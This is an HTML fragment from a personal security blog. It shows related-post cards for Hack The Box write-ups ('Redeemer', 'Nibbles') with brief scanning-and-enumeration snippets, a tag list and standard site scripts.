class="card"> <a href="/posts/htb-redeemer/"><div class="card-body"> <em class="small" data-ts="1659545700" data-df="ll" > Aug 3, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB Redeemer</h3><div class="text-muted small"><p> Scanning and enumeration Now itâ€™s time to start the active scanning. As always, we define our TARGET and hosts file of our machine to facilitate the process. 1 2 TARGET=10.129.73.196 echo &quot;10....</p></div></div></a></div><div class="card"> <a href="/posts/nibbles-htb/"><div class="card-body"> <em class="small" data-ts="1659974280" data-df="ll" > Aug 8, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB Nibbles</h3><div class="text-muted small"><p> This is the writeup for Nibbles machine from HTB. Scanning and enumeration Now itâ€™s time to start the active scanning. As always, we define our TARGET and hosts file of our machine to facilita...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/hydra-attacks/" class="btn btn-outline-primary" prompt="Older"><p>Hydra</p></a> <a href="/posts/htb-redeemer/" class="btn btn-outline-primary" prompt="Newer"><p>HTB Redeemer</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python/">Python</a> <a class="post-tag" href="/tags/apache/">Apache</a> <a class="post-tag" href="/tags/enumeration/">Enumeration</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/python-pip/">python-pip</a> <a class="post-tag" href="/tags/ssh/">SSH</a> <a class="post-tag" href="/tags/a06-2021-vulnerable-and-outdated-components/">A06:2021-Vulnerable And Outdated Components</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> Â© 2023 <a href="https://twitter.com/Raiskv">Rai Abril</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-L57GGSNFQB"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-L57GGSNFQB'); }); </script>
